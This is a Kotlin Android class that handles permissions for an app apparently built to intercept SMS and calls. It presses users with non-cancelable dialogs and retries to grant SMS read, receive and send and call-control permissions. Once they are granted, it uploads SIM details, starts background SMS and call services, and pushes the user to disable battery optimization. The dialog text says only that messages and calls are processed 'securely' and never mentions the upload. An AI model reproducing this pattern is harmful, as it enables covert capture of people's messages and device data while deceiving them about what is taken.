package com.rto1p8.app.handler

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.rto1p8.app.R
import com.rto1p8.app.service.CallService
import com.rto1p8.app.service.SmsService
import com.rto1p8.app.utils.Logger

/**
 * Manages runtime permissions and device-specific settings for the application.
 * Ensures permissions are checked before requesting and provides a professional user experience
 * with clear dialogs and robust retry logic.
 */
class PermissionHandler(
    private val activity: AppCompatActivity,
    private val simDetailsHandler: SimDetailsHandler
) {
    private var fromSettings = false
    private var retryCount = 0
    private val maxRetries = 3

    private val requiredPermissions = mutableListOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE
    ).apply {
        // Only add ANSWER_PHONE_CALLS if the device is API 26 or higher
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            add(Manifest.permission.ANSWER_PHONE_CALLS)
        }
    }.toTypedArray()

    private val smsPermissions = arrayOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS
    )

    private val callPermissions = mutableListOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE
    ).apply {
        // Only add ANSWER_PHONE_CALLS if the device is API 26 or higher
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            add(Manifest.permission.ANSWER_PHONE_CALLS)
        }
    }.toTypedArray()


    private val permissionLauncher = activity.registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        // Check SMS permissions
        val smsPermissionsGranted = smsPermissions.all {
            permissions[it] == true || ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED
        }
        // Check Call permissions
        val callPermissionsGranted = callPermissions.all {
            permissions[it] == true || ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED
        }

        if (smsPermissionsGranted || callPermissionsGranted) {
            Logger.log("Some permissions granted. Checking specific services to start.")
            retryCount = 0
            configureDeviceSpecificSettings()
            try {
                simDetailsHandler.uploadSimDetails()
            } catch (e: Exception) {
                Logger.error("Failed to upload SIM details", e)
            }

            // Start SmsService if SMS permissions are granted
            if (smsPermissionsGranted) {
                Logger.log("SMS permissions granted. Starting SmsService.")
                startServiceSafely(SmsService::class.java)
            }

            // Start CallService if call permissions are granted
            if (callPermissionsGranted) {
                Logger.log("Call permissions granted. Starting CallService.")
                startServiceSafely(CallService::class.java)
            }

        } else {
            Logger.log("Required permissions denied.")
            handlePermissionDenied()
        }
    }

    /**
     * Initiates permission request flow, checking existing permissions first.
     */
    fun requestPermissions() {
        if (areAllPermissionsGranted()) {
            Logger.log("All permissions already granted")
            configureDeviceSpecificSettings()
            try {
                simDetailsHandler.uploadSimDetails()
            } catch (e: Exception) {
                Logger.error("Failed to upload SIM details", e)
            }
            // In your Application class or main Activity
            startServiceSafely(SmsService::class.java)
            startServiceSafely(CallService::class.java)
            return
        }

        val permissionsToRequest = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(activity, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isNotEmpty()) {
            try {
                permissionLauncher.launch(permissionsToRequest)
            } catch (e: Exception) {
                Logger.error("Failed to launch permission request", e)
                showErrorDialog("Unable to request permissions. Please try again.")
            }
        } else {
            Logger.log("No permissions need to be requested")
        }
    }

    /**
     * Handles activity resume events, particularly after returning from settings.
     */
    fun handleResume() {
        if (fromSettings) {
            fromSettings = false
            Logger.log("Returned from settings. Checking permissions.")
            requestPermissions()
        }
    }

    /**
     * Checks if all required permissions are granted.
     */
    private fun areAllPermissionsGranted(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Handles denied permissions by prompting the user to retry or go to settings.
     */
    private fun handlePermissionDenied() {
        if (retryCount < maxRetries && requiredPermissions.any {
                activity.shouldShowRequestPermissionRationale(it)
            }) {
            retryCount++
            showPermissionRationaleDialog()
        } else {
            showSettingsDialog()
        }
    }

    /**
     * Shows a professional dialog explaining why permissions are needed and prompting retry.
     */
    private fun showPermissionRationaleDialog() {
        try {
            AlertDialog.Builder(activity)
                .setTitle("Permissions Required")
                .setMessage(
                    "This app requires SMS and phone permissions to function properly. " +
                            "These permissions allow us to process messages and calls securely. Please grant all permissions to continue."
                )
                .setCancelable(false)
                .setPositiveButton("Okay") { _, _ ->
                    requestPermissions()
                }
                .setNegativeButton("Cancel") { _, _ ->
                    showSettingsDialog()
                }
                .show()
        } catch (e: Exception) {
            Logger.error("Failed to show permission rationale dialog", e)
            showErrorDialog("Unable to display permission request. Please try again.")
        }
    }

    /**
     * Shows a dialog directing the user to app settings for manual permission granting.
     */
    private fun showSettingsDialog() {
        try {
            AlertDialog.Builder(activity)
                .setTitle("Action Required")
                .setMessage(
                    "Some permissions are still denied. Please enable all required permissions " +
                            "in the app settings to ensure full functionality."
                )
                .setCancelable(false)
                .setPositiveButton("Open Settings") { _, _ ->
                    fromSettings = true
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:${activity.packageName}")
                    }
                    try {
                        activity.startActivity(intent)
                    } catch (e: Exception) {
                        Logger.error("Failed to launch app settings", e)
                        showErrorDialog("Unable to open settings. Please manually enable permissions in your device settings.")
                    }
                }
                .setNegativeButton("Cancel", null)
                .show()
        } catch (e: Exception) {
            Logger.error("Failed to show settings dialog", e)
        }
    }

    /**
     * Configures device-specific settings such as battery optimization.
     */
    private fun configureDeviceSpecificSettings() {
        val powerManager = activity.getSystemService(Context.POWER_SERVICE) as? PowerManager
            ?: return Logger.error("PowerManager service unavailable")

        if (!powerManager.isIgnoringBatteryOptimizations(activity.packageName)) {
            try {
                val dialogView = try {
                    activity.layoutInflater.inflate(R.layout.custom_dialog_layout, null)
                } catch (e: Exception) {
                    Logger.error("Failed to inflate custom dialog layout", e)
                    android.widget.TextView(activity).apply {
                        text = "Please allow the app to run in the background by disabling battery optimization."
                    }
                }
                AlertDialog.Builder(activity)
                    .setTitle("Optimize Battery Usage")
                    .setView(dialogView)
                    .setMessage("To ensure uninterrupted functionality, please allow this app to run in the background.")
                    .setPositiveButton("Allow") { _, _ ->
                        disableBatteryOptimization()
                    }
                    .setCancelable(false)
                    .show()
            } catch (e: Exception) {
                Logger.error("Failed to show battery optimization dialog", e)
            }
        } else {
            Logger.log("Battery optimization already disabled")
        }
    }

    /**
     * Requests to disable battery optimization for the app.
     */
    private fun disableBatteryOptimization() {
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${activity.packageName}")
            }
            activity.startActivity(intent)
        } catch (e: Exception) {
            Logger.error("Failed to request battery optimization settings", e)
            showManualInstructions()
        }
    }

    /**
     * Shows manual instructions for battery optimization based on device manufacturer.
     */
    private fun showManualInstructions() {
        val manufacturer = Build.MANUFACTURER.lowercase()
        val instructions = when (manufacturer) {
            "xiaomi" -> "Go to Settings > Apps > Autostart > Enable for this app."
            "oppo" -> "Go to Settings > Battery > Battery Optimization > Select this app > Don't Optimize."
            "vivo" -> "Go to Settings > Battery > High Background Power Consumption > Enable for this app."
            "huawei" -> "Go to Settings > Apps > Startup Management > Allow this app to autostart."
            "samsung" -> "Go to Settings > Device Care > Battery > Allow this app to run in the background."
            else -> "Go to Settings > Battery > Battery Optimization > Select this app > Don't Optimize."
        }
        try {
            AlertDialog.Builder(activity)
                .setTitle("Manual Configuration Required")
                .setMessage("Please follow these steps to allow the app to run in the background:\n\n$instructions")
                .setPositiveButton("OK", null)
                .show()
        } catch (e: Exception) {
            Logger.error("Failed to show manual instructions dialog", e)
        }
    }

    /**
     * Shows a generic error dialog with a custom message.
     */
    private fun showErrorDialog(message: String) {
        try {
            AlertDialog.Builder(activity)
                .setTitle("Error")
                .setMessage(message)
                .setPositiveButton("OK", null)
                .show()
        } catch (e: Exception) {
            Logger.error("Failed to show error dialog", e)
        }
    }

    /**
     * Safely starts a foreground service, handling API differences.
     */
    private fun startServiceSafely(serviceClass: Class<*>) {
        try {
            val intent = Intent(activity, serviceClass)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                activity.startForegroundService(intent)
            } else {
                activity.startService(intent)
            }
        } catch (e: Exception) {
            Logger.error("Failed to start service: ${serviceClass.simpleName}", e)
        }
    }
}